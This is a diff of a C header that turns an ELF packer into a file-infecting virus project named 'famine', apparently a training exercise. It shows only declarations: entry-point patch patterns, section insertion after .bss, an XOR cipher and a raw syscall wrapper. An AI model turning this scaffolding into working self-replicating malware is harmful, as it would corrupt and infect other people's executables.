@@ -1,5 +1,5 @@
-#ifndef WOODY_WOODPACKER_H
-# define WOODY_WOODPACKER_H
+#ifndef FAMINE_H
+# define FAMINE_H
 
 # include "tools.h"
 
@@ -17,14 +17,16 @@
 # include <unistd.h>
 # include <string.h>
 
-# define USAGE "Usage: %s elf_file [key]\n"
+# define BYTECODE	"" // to remove
 
-# define KEY_DEFAULT_SIZE 64
+# define KEY_SIZE 64
+
+# define VIRUS_NAME "famine"
 
 # define NEW_BIN_FILENAME "woody"
 # define BYTECODE_SIZE sizeof(BYTECODE)
 
-# define PATTERN_ENTRY_OLD 		0xAAAAAAe9
+# define PATTERN_ENTRY_OLD		0xAAAAAAe9
 # define PATTERN_ENTRY_OLD_SIZE_OPCODE	1
 
 # define PATTERN_KEY_SIZE		0xBBBBBBBBBBBBBBBB
@@ -39,14 +41,13 @@
 typedef enum {false, true} bool;
 
 typedef struct	s_key {
-	char	*raw;
+	char	raw[KEY_SIZE];
 	size_t	length;
 }		t_key;
 
 typedef struct	s_woody {
-	char		*woody_name;
+	char		*target;
 	struct s_key	key;
-	int		bin_fd;
 	struct stat	bin_st;
 	void		*bin_map;
 	Elf64_Ehdr	ehdr;		// Ehdr copy with good endian
@@ -58,6 +59,9 @@ typedef struct	s_woody {
 	bool		reverse_endian;
 }		t_woody;
 
+typedef struct	s_famine {
+	t_woody		woody;
+}		t_famine;
 
 void	exit_clean(struct s_woody *woody, int exit_status);
 
@@ -87,8 +91,6 @@ void	modify_shdr_last(struct s_woody *woody, Elf64_Shdr *shdr_last, uint16_t ind
 
 void	insert_section_after_bss(struct s_woody *woody);
 
-void	xor_cipher(char *key, size_t key_size, void *text, size_t text_size);
-
 void	save_new_section(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *shdr_bss);
 void	save_new_shdr(struct s_woody *woody, int new_bin_fd, Elf64_Shdr *new_section);
 void	save_new_elf_file(struct s_woody *woody, Elf64_Shdr *shdr_bss, uint16_t index_shdr_bss);
@@ -98,64 +100,8 @@ void	debug_print_headers(struct s_woody *woody);
 void	debug_print_program_header(struct s_woody *woody);
 void	debug_print_section_header(struct s_woody *woody);
 
-
-/*
-##########################
-
-\-----> Elf Header
-
-#define EI_NIDENT 16
-
-typedef struct {
-	unsigned char e_ident[EI_NIDENT];
-	uint16_t      e_type;
-	uint16_t      e_machine;
-	uint32_t      e_version;
-	ElfN_Addr     e_entry;
-	ElfN_Off      e_phoff;
-	ElfN_Off      e_shoff;
-	uint32_t      e_flags;
-	uint16_t      e_ehsize;
-	uint16_t      e_phentsize;
-	uint16_t      e_phnum;
-	uint16_t      e_shentsize;
-	uint16_t      e_shnum;
-	uint16_t      e_shstrndx;
-} ElfN_Ehdr;
-
-##########################
-
-\-----> Elf Program Header
-
-typedef struct {
-	uint32_t   p_type;
-	uint32_t   p_flags;
-	Elf64_Off  p_offset;
-	Elf64_Addr p_vaddr;
-	Elf64_Addr p_paddr;
-	uint64_t   p_filesz;
-	uint64_t   p_memsz;
-	uint64_t   p_align;
-} Elf64_Phdr;
-
-##########################
-
-\-----> Elf Section Header
-
-typedef struct {
-	uint32_t   sh_name;
-	uint32_t   sh_type;
-	uint64_t   sh_flags;
-	Elf64_Addr sh_addr;
-	Elf64_Off  sh_offset;
-	uint64_t   sh_size;
-	uint32_t   sh_link;
-	uint32_t   sh_info;
-	uint64_t   sh_addralign;
-	uint64_t   sh_entsize;
-} Elf64_Shdr;
-
-##########################
-*/
+// asm func
+void	xor_cipher(char *key, size_t key_size, void *text, size_t text_size);
+long	syscall_wrapper(long number, ...);
 
 #endif
